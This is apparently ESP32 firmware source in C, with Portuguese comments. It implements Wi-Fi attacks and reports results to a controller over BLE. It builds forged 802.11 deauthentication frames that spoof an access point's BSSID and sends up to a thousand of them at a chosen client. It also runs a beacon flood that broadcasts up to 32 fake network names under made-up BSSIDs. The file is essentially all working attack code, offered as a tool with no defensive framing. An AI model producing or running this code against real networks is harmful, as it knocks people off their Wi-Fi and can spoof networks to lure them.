#include "hacking_wifi.h"
#include "tlv.h"
#include "transport_ble.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "hack-wifi";

// Template do frame de deauth (802.11 Mgmt subtype 0xC).
// Tamanho 26 bytes: header 802.11 (24) + reason code (2).
//
// Layout:
//   [0..1]   frame control: 0xC0 0x00 (type=Mgmt, subtype=Deauth)
//   [2..3]   duration: 0
//   [4..9]   addr1 (destination)
//   [10..15] addr2 (source) = AP BSSID
//   [16..21] addr3 (BSSID)  = AP BSSID
//   [22..23] sequence control: 0
//   [24..25] reason code (LE)
static const uint8_t s_deauth_template[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00,
};

// Header fixo do beacon (24 bytes) + body fixo (12 bytes timestamp + interval + capability).
static const uint8_t s_beacon_head[36] = {
    0x80, 0x00,
    0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0, 0, 0, 0, 0, 0, 0, 0,
    0x64, 0x00,
    0x21, 0x04,
};

#define MAX_SSIDS_PER_FLOOD  32
#define MAX_SSID_LEN         32

typedef struct {
    uint8_t target[6];
    uint8_t bssid[6];
    uint8_t channel;
    uint16_t count;
    uint16_t reason;
} deauth_job_t;

typedef struct {
    uint8_t channel;
    uint16_t cycles;
    uint8_t ssid_count;
    char ssids[MAX_SSIDS_PER_FLOOD][MAX_SSID_LEN + 1];
} beacon_job_t;

static volatile bool s_busy = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

bool hacking_wifi_busy(void)
{
    return s_busy;
}

esp_err_t hacking_wifi_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

static void emit_deauth_done(uint16_t sent, uint16_t requested,
                              uint8_t channel, uint16_t reason)
{
    uint8_t payload[7];
    payload[0] = (uint8_t)(sent >> 8);      payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(requested >> 8); payload[3] = (uint8_t)(requested & 0xFF);
    payload[4] = channel;
    payload[5] = (uint8_t)(reason >> 8);    payload[6] = (uint8_t)(reason & 0xFF);

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_DEAUTH_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void emit_beacon_done(uint16_t sent, uint16_t cycles,
                              uint8_t channel, uint8_t ssid_count)
{
    uint8_t payload[6];
    payload[0] = (uint8_t)(sent >> 8);   payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(cycles >> 8); payload[3] = (uint8_t)(cycles & 0xFF);
    payload[4] = channel;
    payload[5] = ssid_count;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_BEACON_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void deauth_task(void *arg)
{
    deauth_job_t *job = (deauth_job_t *)arg;

    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
    uint16_t sent = 0;

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
                 job->channel, esp_err_to_name(err));
    } else {
        uint8_t frame[sizeof(s_deauth_template)];
        memcpy(frame, s_deauth_template, sizeof(frame));
        memcpy(&frame[4],  job->target, 6);
        memcpy(&frame[10], job->bssid,  6);
        memcpy(&frame[16], job->bssid,  6);
        frame[24] = (uint8_t)(job->reason & 0xFF);
        frame[25] = (uint8_t)((job->reason >> 8) & 0xFF);

        for (uint16_t i = 0; i < job->count; i++) {
            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            if (err == ESP_OK) {
                sent++;
            } else if (i == 0) {
                ESP_LOGE(TAG, "tx rc=%s (kernel filtering deauth?)",
                         esp_err_to_name(err));
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(3));
        }
    }

    ESP_LOGI(TAG, "deauth %u/%u on ch=%u reason=%u",
             (unsigned)sent, (unsigned)job->count,
             (unsigned)job->channel, (unsigned)job->reason);

    emit_deauth_done(sent, job->count, job->channel, job->reason);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_wifi_deauth(const uint8_t target_mac[6],
                              const uint8_t ap_bssid[6],
                              uint8_t channel,
                              uint16_t count,
                              uint16_t reason_code)
{
    if (!target_mac || !ap_bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (count == 0) count = 10;
    if (count > 1000) count = 1000;
    if (reason_code == 0) reason_code = 7;

    deauth_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    memcpy(job->target, target_mac, 6);
    memcpy(job->bssid,  ap_bssid,   6);
    job->channel = channel;
    job->count = count;
    job->reason = reason_code;

    s_busy = true;
    if (xTaskCreate(deauth_task, "deauth", 4096, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

static void make_bssid(uint8_t out[6], const char *ssid, size_t idx)
{
    uint32_t h = 2166136261u;
    for (const unsigned char *p = (const unsigned char *)ssid; *p; p++) {
        h ^= *p;
        h *= 16777619u;
    }
    h ^= (uint32_t)idx * 2654435761u;
    out[0] = 0x02;
    out[1] = (uint8_t)((h >> 24) & 0xFF);
    out[2] = (uint8_t)((h >> 16) & 0xFF);
    out[3] = (uint8_t)((h >> 8) & 0xFF);
    out[4] = (uint8_t)(h & 0xFF);
    out[5] = (uint8_t)(idx & 0xFF);
}

static void beacon_task(void *arg)
{
    beacon_job_t *job = (beacon_job_t *)arg;

    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
    uint16_t sent = 0;

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_channel ch=%u rc=%s",
                 job->channel, esp_err_to_name(err));
    } else {
        // header(36) + ssid(2+32) + rates(6) + DS(3) + TIM(6) + ERP(3) + ExtRates(6)
        uint8_t frame[36 + 34 + 6 + 3 + 6 + 3 + 6];

        for (uint16_t cyc = 0; cyc < job->cycles; cyc++) {
            for (size_t i = 0; i < job->ssid_count; i++) {
                const char *ssid = job->ssids[i];
                size_t slen = strlen(ssid);
                if (slen > MAX_SSID_LEN) slen = MAX_SSID_LEN;

                uint8_t bssid[6];
                make_bssid(bssid, ssid, i);

                size_t off = 0;
                memcpy(&frame[off], s_beacon_head, sizeof(s_beacon_head));
                memcpy(&frame[10], bssid, 6);
                memcpy(&frame[16], bssid, 6);
                off += sizeof(s_beacon_head);

                frame[off++] = 0x00;
                frame[off++] = (uint8_t)slen;
                memcpy(&frame[off], ssid, slen);
                off += slen;

                frame[off++] = 0x01; frame[off++] = 0x04;
                frame[off++] = 0x82; frame[off++] = 0x84;
                frame[off++] = 0x8B; frame[off++] = 0x96;

                frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = job->channel;

                frame[off++] = 0x05; frame[off++] = 0x04;
                frame[off++] = 0x00; frame[off++] = 0x01;
                frame[off++] = 0x00; frame[off++] = 0x00;

                frame[off++] = 0x2A; frame[off++] = 0x01; frame[off++] = 0x00;

                frame[off++] = 0x32; frame[off++] = 0x04;
                frame[off++] = 0x0C; frame[off++] = 0x12;
                frame[off++] = 0x18; frame[off++] = 0x60;

                err = esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
                if (err == ESP_OK) sent++;
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
    }

    ESP_LOGI(TAG, "beacon_flood: %u frames (%u cycles × %u ssids) on ch=%u",
             (unsigned)sent, (unsigned)job->cycles,
             (unsigned)job->ssid_count, (unsigned)job->channel);

    emit_beacon_done(sent, job->cycles, job->channel, job->ssid_count);

    free(job);
    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_wifi_beacon_flood(uint8_t channel,
                                    uint16_t cycles,
                                    const char *const *ssids,
                                    size_t ssid_count)
{
    if (channel == 0 || channel > 14 || !ssids || ssid_count == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_busy) return ESP_ERR_INVALID_STATE;

    if (ssid_count > MAX_SSIDS_PER_FLOOD) ssid_count = MAX_SSIDS_PER_FLOOD;
    if (cycles == 0) cycles = 50;
    if (cycles > 200) cycles = 200;

    beacon_job_t *job = calloc(1, sizeof(*job));
    if (!job) return ESP_ERR_NO_MEM;
    job->channel = channel;
    job->cycles = cycles;
    job->ssid_count = (uint8_t)ssid_count;
    for (size_t i = 0; i < ssid_count; i++) {
        const char *src = ssids[i] ? ssids[i] : "";
        strncpy(job->ssids[i], src, MAX_SSID_LEN);
        job->ssids[i][MAX_SSID_LEN] = 0;
    }

    s_busy = true;
    // Stack maior — frame array tem ~94 bytes + cJSON na call chain anterior.
    if (xTaskCreate(beacon_task, "beacon_flood", 4096, job, 5, &s_task) != pdPASS) {
        free(job);
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
